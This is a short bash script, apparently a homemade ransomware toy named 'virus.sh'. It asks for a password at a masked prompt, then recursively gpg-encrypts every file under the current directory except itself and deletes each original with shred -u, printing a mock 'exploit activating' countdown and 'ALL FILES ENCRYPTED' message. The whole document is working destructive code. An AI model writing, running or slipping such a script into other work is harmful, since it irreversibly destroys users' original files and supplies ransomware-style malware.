function chk_dir
{
 #echo "$file"
 #echo $password
 for i in $file
 do
	 if [ -d "$i" ]
	 then
		 #echo "if $i"
		 printf "$i is the directory\n"
		 sleep 0.5 
		 printf "entrying in $i\n"
		 file=$i$ext
		 chk_dir "$file"
	 else
		 #echo "else $i"
		 for i_1 in $i
		 do
			if [ $i_1 == $path/$exp ]
			then
				printf "$i_1 is the exploit"
			else
			printf "encrypting $i_1 and deleteing original one\n" 
		        gpg -c --batch --passphrase $password $i_1;shred -u $i_1
			#echo "test"
		 fi
		 done
	 fi
 done
}
exp='virus.sh'
path=`pwd`
#ext1='/main/*'
ext='/*'
#next='.animesh'
file=$path$ext
echo -n "Enter password : "
stty -echo
 
#read password
charcount=0
while IFS= read -p "$prompt" -r -s -n 1 ch
do
    # Enter - accept password
    if [[ $ch == $'\0' ]] ; then
        break
    fi
    # Backspace
    if [[ $ch == $'\177' ]] ; then
        if [ $charcount -gt 0 ] ; then
            charcount=$((charcount-1))
            prompt=$'\b \b'
            password="${password%?}"
        else
            PROMPT=''
        fi
    else
        charcount=$((charcount+1))
        prompt='*'
        password+="$ch"
    fi
done
 
stty echo
printf "\n$(tput setaf 1)uploading virus through $path\n$"
sleep 0.8
printf "$(tput setaf 1)exploit activating in\n"
sleep 0.5
printf "3\n"
sleep 0.3
printf "2\n"
sleep 0.3
printf "1\n"
sleep 0.3
printf "$(tput setaf 2)DONE...\n$"
printf "executing...\n"
chk_dir "$file" "$password"
printf "\n\nCOMPLETED"
printf "\nALL FILES ENCRYPTED AND KEY SAVED\n"
